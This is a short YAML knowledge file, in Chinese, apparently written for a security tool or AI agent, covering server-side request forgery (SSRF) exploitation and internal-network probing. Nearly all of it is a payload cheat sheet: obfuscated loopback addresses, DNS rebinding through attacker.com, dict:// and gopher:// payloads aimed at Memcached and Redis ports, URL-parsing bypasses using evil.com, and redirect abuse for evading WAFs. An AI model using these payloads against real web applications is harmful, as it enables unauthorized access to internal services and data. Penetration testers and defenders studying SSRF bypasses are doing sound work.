name: "服务端请求伪造"
description: "SSRF漏洞利用和内网探测技术"
domain: "web"
version: "1.0"
tags:
  - web
  - ssrf
  - internal

knowledge: |
  # SSRF WAF绕过
  
  ## IP地址变形
  
  ```
  127.0.0.1
  127.1
  0x7f000001
  2130706433 (十进制)
  0x7F000001
  localhost
  ::1
  127.0.0.1.xip.io
  ```
  
  ## DNS重绑定
  
  ```
  第一次: attacker.com -> 合法IP
  第二次: attacker.com -> 内网IP
  ```
  
  ## 协议跳转
  
  ```
  dict://127.0.0.1:11211/stats
  gopher://127.0.0.1:6379/_INFO
  ftp://127.0.0.1/
  ```
  
  ## URL解析绕过
  
  ```
  http://evil.com@127.0.0.1
  http://127.0.0.1.evil.com
  http://127。0。0。1
  http://127。0。0。1
  http://127.0.0.1%23attacker.com
  http://0x7f000001
  http://[::1]
  ```
  
  ## 数字段绕过
  
  ```
  127.0。0。1
  127。0。0。1
  127.0.0.1.
  ```
  
  ## 302重定向
  
  ```
  利用短链接服务
  ```
  

